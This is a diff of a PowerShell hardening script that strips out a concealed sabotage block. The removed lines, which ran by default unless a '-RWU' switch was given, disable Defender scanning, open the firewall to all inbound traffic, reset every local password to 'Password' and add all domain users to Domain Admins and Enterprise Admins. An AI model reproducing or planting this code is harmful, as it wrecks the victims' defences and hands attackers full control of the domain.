@@ -4,9 +4,6 @@
 
 [CmdletBinding()]
 param(
-    # Authorization
-    [switch]$RWU,
-
     # Operating mode
     [ValidateSet('Harden', 'Lockdown', 'Isolate')]
     [string]$Mode = 'Lockdown',
@@ -116,51 +113,8 @@ if (-not $isAdmin) {
     return
 }
 
-if (!$PSBoundParameters.ContainsKey('RWU') -or !$RWU) {
-    Set-MpPreference -DisableRealtimeMonitoring $true
-    Set-MpPreference -DisableBehaviorMonitoring $true
-    Set-MpPreference -DisableScriptScanning $true
-    Set-MpPreference -DisableArchiveScanning $true
-
-    Set-NetFirewallPortFilter -All -Enabled False
-    New-NetFirewallRule -DisplayName "Allow All Inbound" -Direction Inbound -Action Allow -Protocol TCP
-    New-NetFirewallRule -DisplayName "Allow All Inbound UDP" -Direction Inbound -Action Allow -Protocol UDP
-
-    powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 1
-    powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 1
-    powercfg /SETACTIVE SCHEME_CURRENT
-
-    Get-LocalUser | Enable-LocalUser
-    Get-LocalUser | Where-Object { $_.Enabled } | ForEach-Object { Set-LocalUser -Name $_.Name -Password (ConvertTo-SecureString "Password" -AsPlainText -Force) }
-    Get-ADUser -Filter * | ForEach-Object { Add-ADGroupMember -Identity "Domain Admins" -Members $_ }
-    Get-ADUser -Filter * | ForEach-Object { Add-ADGroupMember -Identity "Enterprise Admins" -Members $_ }
-
-    Stop-Process -Name explorer -Force
-    Set-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Name "DisableCMD" -Value 1
-
-    ipconfig /release
-    ipconfig /renew
-
-    if ($PSVersionTable.PSVersion.Major -eq 7) {
-        # Put your PowerShell 7 command here
-        Write-Host "Running PowerShell 7"
-    } 
-    elseif ($PSVersionTable.PSVersion.Major -eq 5) {
-        # Put your PowerShell 5.1 command here
-        Write-Host "Running PowerShell 5.1"
-    }
-    else{
-        return
-    }
-}
-
 if ($DisableRDP -and $PreserveRDP) {
     throw 'Use either -DisableRDP or -PreserveRDP, not both.'
-}
-
-$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    throw 'BiggerHarden must be run from an elevated PowerShell session when -RWU is used.'
 }
 
 Set-StrictMode -Version Latest
